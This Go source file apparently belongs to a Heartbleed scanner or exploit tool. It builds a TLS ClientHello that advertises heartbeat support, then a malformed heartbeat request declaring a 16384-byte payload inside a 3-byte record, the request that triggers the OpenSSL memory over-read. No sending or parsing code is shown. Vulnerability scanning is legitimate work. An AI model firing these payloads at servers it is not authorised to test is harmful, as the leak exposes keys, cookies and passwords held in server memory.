package heartbleed

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
)

// TLS record types.
const (
	recordTypeHandshake  = 0x16
	recordTypeHeartbeat  = 0x18
	heartbeatMessageType = 0x01
	handshakeTypeHello   = 0x01
	defaultHeartbeatLen  = 0x4000 // 16384 bytes
)

// TLS cipher suites.
var defaultCipherSuites = []uint16{
	0xc014, // TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
	0xc00a, // TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
	0xc022, // TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
	0xc021, // TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
	0x0039, // TLS_DHE_RSA_WITH_AES_256_CBC_SHA
	0x0038, // TLS_DHE_DSS_WITH_AES_256_CBC_SHA
	0x0088, // TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
	0x0087, // TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
	0xc00f, // TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
	0xc005, // TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
	0x0035, // TLS_RSA_WITH_AES_256_CBC_SHA
	0x0084, // TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
	0xc012, // TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
	0xc008, // TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
	0xc01c, // TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
	0xc01b, // TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
	0x0016, // TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
	0x0013, // TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
	0xc00d, // TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
	0xc003, // TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
	0x000a, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
	0xc013, // TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
	0xc009, // TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
	0xc01f, // TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
	0xc01e, // TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
	0x0033, // TLS_DHE_RSA_WITH_AES_128_CBC_SHA
	0x0032, // TLS_DHE_DSS_WITH_AES_128_CBC_SHA
	0x009a, // TLS_DHE_RSA_WITH_SEED_CBC_SHA
	0x0099, // TLS_DHE_DSS_WITH_SEED_CBC_SHA
	0x0045, // TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
	0x0044, // TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
	0xc00e, // TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
	0xc004, // TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
	0x002f, // TLS_RSA_WITH_AES_128_CBC_SHA
	0x0096, // TLS_RSA_WITH_SEED_CBC_SHA
	0x0041, // TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
	0xc011, // TLS_ECDHE_RSA_WITH_RC4_128_SHA
	0xc007, // TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
	0xc00c, // TLS_ECDH_RSA_WITH_RC4_128_SHA
	0xc002, // TLS_ECDH_ECDSA_WITH_RC4_128_SHA
	0x0005, // TLS_RSA_WITH_RC4_128_SHA
	0x0004, // TLS_RSA_WITH_RC4_128_MD5
	0x0015, // TLS_DHE_RSA_WITH_DES_CBC_SHA
	0x0012, // TLS_DHE_DSS_WITH_DES_CBC_SHA
	0x0009, // TLS_RSA_WITH_DES_CBC_SHA
	0x0014, // TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
	0x0011, // TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
	0x0008, // TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
	0x0006, // TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
	0x0003, // TLS_RSA_EXPORT_WITH_RC4_40_MD5
}

// TLS extension types.
const (
	extensionServerName          uint16 = 0x0000
	extensionSecureRenegotiation uint16 = 0xff01
	extensionSessionTicket       uint16 = 0x0023
	extensionHeartbeat           uint16 = 0x000f
)

// TLS compression methods.
const (
	compressionNone uint8 = 0
)

// HeartbeatMessage represents the structure of a TLS heartbeat message.
type HeartbeatMessage struct {
	ContentType uint8
	TLSVersion  uint16
	Length      uint16
	HBType      uint8
	PayloadLen  uint16
}

// ClientHelloMessage represents the structure of a TLS client hello message.
type ClientHelloMessage struct {
	ContentType   uint8
	TLSVersion    uint16
	Length        uint16
	HandshakeType uint8
	HSLength      [3]byte // 24-bit integer
	HSVersion     uint16
	Random        [32]byte
	SessionIDLen  uint8
	CipherSuites  []uint16
	CompMethods   []uint8
	Extensions    []Extension
}

// Extension represents a TLS extension.
type Extension struct {
	Type uint16
	Data []byte
}

func makePayload(tlsVers int) []byte {
	buf := new(bytes.Buffer)
	msg := HeartbeatMessage{
		ContentType: recordTypeHeartbeat,
		TLSVersion:  uint16(tlsVers), //nolint:gosec // disable G115
		Length:      3,               // fixed length for heartbeat
		HBType:      heartbeatMessageType,
		PayloadLen:  defaultHeartbeatLen,
	}

	_ = binary.Write(buf, binary.BigEndian, msg.ContentType)
	_ = binary.Write(buf, binary.BigEndian, msg.TLSVersion)
	_ = binary.Write(buf, binary.BigEndian, msg.Length)
	_ = binary.Write(buf, binary.BigEndian, msg.HBType)
	_ = binary.Write(buf, binary.BigEndian, msg.PayloadLen)

	return buf.Bytes()
}

func makeClientHello(tlsVers int) []byte {
	buf := new(bytes.Buffer)

	// Generate random bytes for the client hello
	var random [32]byte

	_, _ = rand.Read(random[:])

	// Create extensions
	extensions := []Extension{
		{
			Type: extensionServerName,
			Data: []byte{0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02}, // SNI extension data
		},
		{
			Type: extensionSecureRenegotiation,
			Data: []byte{0x00}, // Empty renegotiation info
		},
		{
			Type: extensionSessionTicket,
			Data: []byte{}, // Empty session ticket
		},
		{
			Type: extensionHeartbeat,
			Data: []byte{0x01}, // Peer allowed to send heartbeat requests
		},
	}

	// Create client hello message
	msg := ClientHelloMessage{
		ContentType:   recordTypeHandshake,
		TLSVersion:    uint16(tlsVers), //nolint:gosec // disable G115
		Length:        0xdc,            // Total length will be updated
		HandshakeType: handshakeTypeHello,
		HSLength:      [3]byte{0, 0, 0xd8}, // Will be updated
		HSVersion:     uint16(tlsVers),     //nolint:gosec // disable G115
		Random:        random,
		SessionIDLen:  0,
		CipherSuites:  defaultCipherSuites,
		CompMethods:   []uint8{compressionNone},
		Extensions:    extensions,
	}

	// Create a temporary buffer to calculate the handshake message length
	hsBuf := new(bytes.Buffer)

	// Write handshake message body
	_ = binary.Write(hsBuf, binary.BigEndian, msg.HSVersion)
	hsBuf.Write(msg.Random[:])
	_ = binary.Write(hsBuf, binary.BigEndian, msg.SessionIDLen)

	// Write cipher suites
	_ = binary.Write(hsBuf, binary.BigEndian, uint16(len(msg.CipherSuites)*2)) //nolint:gosec // disable G115
	for _, suite := range msg.CipherSuites {
		_ = binary.Write(hsBuf, binary.BigEndian, suite)
	}

	// Write compression methods
	_ = binary.Write(hsBuf, binary.BigEndian, uint8(len(msg.CompMethods))) //nolint:gosec // disable G115
	for _, comp := range msg.CompMethods {
		_ = binary.Write(hsBuf, binary.BigEndian, comp)
	}

	// Write extensions length
	extBuf := new(bytes.Buffer)
	for _, ext := range msg.Extensions {
		_ = binary.Write(extBuf, binary.BigEndian, ext.Type)
		_ = binary.Write(extBuf, binary.BigEndian, uint16(len(ext.Data))) //nolint:gosec // disable G115
		extBuf.Write(ext.Data)
	}

	_ = binary.Write(hsBuf, binary.BigEndian, uint16(extBuf.Len())) //nolint:gosec // disable G115
	hsBuf.Write(extBuf.Bytes())

	//nolint:gosec // disable G115
	// Update lengths
	msg.Length = uint16(hsBuf.Len()) + 4 // +4 for handshake type and 24-bit length
	copy(msg.HSLength[:], []byte{0, byte(hsBuf.Len() >> 8), byte(hsBuf.Len())})

	// Write the final message
	_ = binary.Write(buf, binary.BigEndian, msg.ContentType)
	_ = binary.Write(buf, binary.BigEndian, msg.TLSVersion)
	_ = binary.Write(buf, binary.BigEndian, msg.Length)
	_ = binary.Write(buf, binary.BigEndian, msg.HandshakeType)
	buf.Write(msg.HSLength[:])
	buf.Write(hsBuf.Bytes())

	return buf.Bytes()
}
